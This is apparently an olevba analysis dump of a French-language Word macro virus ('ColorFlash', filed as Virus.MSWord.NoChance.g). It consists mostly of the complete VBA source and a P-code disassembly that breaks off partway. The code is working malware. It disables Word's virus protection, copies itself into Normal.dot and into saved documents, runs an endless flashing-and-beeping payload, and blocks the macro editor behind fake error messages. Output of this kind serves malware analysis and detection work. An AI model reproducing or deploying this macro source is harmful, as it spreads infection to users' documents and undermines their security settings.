olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NoChance.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NoChance.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ColorFlash.bas 
in file: Virus.MSWord.NoChance.g - OLE stream: 'Macros/VBA/ColorFlash'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 2)
T$ = Mid(MyTime, 1, 2)
If D$ = "15" Then
    MsgBox "Il faut mettre un peu de couleur dans votre vie..", vbInformation, "ColorFlash Virus"
    Call PayLoad
End If
If T$ = "15" Then
    MsgBox "Le virus ColorFlash vous souhaite un Bonne Après Midi...", vbInformation, "ZeMacroKiller98"
End If
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "ColorFlash" Then
        ColorFlashInstalled = -1
    End If
Next i
If Not ColorFlashInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ColorFlash", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ColorFlash", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    UserForm900.Show
ErrorFT:
End Sub
Private Sub PayLoad()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPL
ActiveDocument.Shapes.AddTextEffect(msoTextEffect11, "ColorFlash", _
        "Impact", 96#, msoFalse, msoFalse, 87.5, 91.3).Select
Selection.ShapeRange.IncrementLeft -8.3
Selection.ShapeRange.IncrementTop 90.3
Charge:
    ActiveDocument.Shapes.AddShape(msoShapeOval, 0#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 20#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 40#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 60#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 80#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 100#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 120#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 140#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 160#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 180#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 200#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 220#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 240#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
        ActiveDocument.Shapes.AddShape(msoShapeOval, 260#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 280#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 300#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 320#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 340#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 360#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 380#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 400#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 420#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 440#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 255, 0)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 460#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 480#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
    ActiveDocument.Shapes.AddShape(msoShapeOval, 500#, 50, 64.8, 64.8) _
        .Select
    Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 255, 255)
    Beep
    For i = 1 To 50000
    Next i
    Selection.ShapeRange.Delete
GoTo Charge
ErrorPL:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    UserForm999.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm900.frm 
in file: Virus.MSWord.NoChance.g - OLE stream: 'Macros/VBA/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton2_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
Unload UserForm900
End Sub

Private Sub CommandButton6_Click()
Unload UserForm900
End Sub

Private Sub UserForm_Initialize()
    TextBox1.Text = NormalTemplate.Name
    CommandButton2.Enabled = False
    CommandButton3.Enabled = False
    CommandButton4.Enabled = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm999.frm 
in file: Virus.MSWord.NoChance.g - OLE stream: 'Macros/VBA/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Private Sub ListBox1_Click()
    If ListBox1.Selected(0) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    ElseIf ListBox1.Selected(1) = True Then
        CommandButton1.Enabled = True
        CommandButton3.Enabled = True
        CommandButton4.Enabled = True
        CommandButton6.Enabled = True
    Else
        CommandButton1.Enabled = False
        CommandButton3.Enabled = False
        CommandButton4.Enabled = False
        CommandButton6.Enabled = False
    End If
End Sub

Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Commande Word"
    ComboBox1.AddItem "Tous les modèles actifs"
    ComboBox1.AddItem "Normal.dot (modèle global)"
    ComboBox1.AddItem WordBasic.WindowName$()
    CommandButton1.Enabled = False
    CommandButton3.Enabled = False
    TextBox2.Text = "Macro créée le " & Date & " par " & Application.UserName
End Sub

Private Sub CommandButton1_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub CommandButton2_Click()
Unload UserForm999
End Sub

Private Sub CommandButton3_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton4_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton5_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton6_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

Private Sub CommandButton7_Click()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub
Private Sub ScrollBar1_Change()
MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
Unload UserForm999
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.NoChance.g
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/ColorFlash - 17762 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyTime
' Line #5:
' 	Ld Date 
' 	St MyDate 
' Line #6:
' 	Ld Time 
' 	St MyTime 
' Line #7:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #8:
' 	Ld MyTime 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St T$ 
' Line #9:
' 	Ld D$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitStr 0x0031 "Il faut mettre un peu de couleur dans votre vie.."
' 	Ld vbInformation 
' 	LitStr 0x0010 "ColorFlash Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #11:
' 	ArgsCall (Call) PayLoad 0x0000 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld T$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitStr 0x0038 "Le virus ColorFlash vous souhaite un Bonne Après Midi..."
' 	Ld vbInformation 
' 	LitStr 0x000F "ZeMacroKiller98"
' 	ArgsCall MsgBox 0x0003 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub AutoClose())
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	OnError ErrorAC 
' Line #22:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #24:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000A "ColorFlash"
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ColorFlashInstalled 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	Ld ColorFlashInstalled 
' 	Not 
' 	IfBlock 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "ColorFlash"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Label ErrorAC 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub FileSaveAs())
' Line #36:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #37:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #39:
' 	OnError ErrorFSA 
' Line #40:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #42:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "ColorFlash"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm900"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "UserForm999"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #48:
' 	Label ErrorFSA 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub FileTemplates())
' Line #51:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #52:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #54:
' 	OnError ErrorFT 
' Line #55:
' 	Ld UserForm900 
' 	ArgsMemCall Show 0x0000 
' Line #56:
' 	Label ErrorFT 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Sub PayLoad())
' Line #59:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #60:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #62:
' 	OnError ErrorPL 
' Line #63:
' 	LineCont 0x0004 0A 00 08 00
' 	Ld msoTextEffect11 
' 	LitStr 0x000A "ColorFlash"
' 	LitStr 0x0006 "Impact"
' 	LitR8 0x0000 0x0000 0x0000 0x4058 
' 	Ld msoFalse 
' 	Ld msoFalse 
' 	LitR8 0x0000 0x0000 0xE000 0x4055 
' 	LitR8 0x3333 0x3333 0xD333 0x4056 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddTextEffect 0x0008 
' 	ArgsMemCall Set 0x0000 
' Line #64:
' 	LitR8 0x999A 0x9999 0x9999 0x4020 
' 	UMi 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementLeft 0x0001 
' Line #65:
' 	LitR8 0x3333 0x3333 0x9333 0x4056 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #66:
' 	Label Charge 
' Line #67:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #68:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #69:
' 	ArgsCall Beep 0x0000 
' Line #70:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #73:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x4034 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #74:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #75:
' 	ArgsCall Beep 0x0000 
' Line #76:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #77:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #79:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x4044 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #80:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #81:
' 	ArgsCall Beep 0x0000 
' Line #82:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #85:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x404E 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #86:
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #87:
' 	ArgsCall Beep 0x0000 
' Line #88:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #89:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #91:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x4054 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #92:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #93:
' 	ArgsCall Beep 0x0000 
' Line #94:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #97:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x4059 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #98:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #99:
' 	ArgsCall Beep 0x0000 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #101:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #102:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall Delete 0x0000 
' Line #103:
' 	LineCont 0x0004 10 00 08 00
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0x0000 0x405E 
' 	LitDI2 0x0032 
' 	LitR8 0x3333 0x3333 0x3333 0x4050 
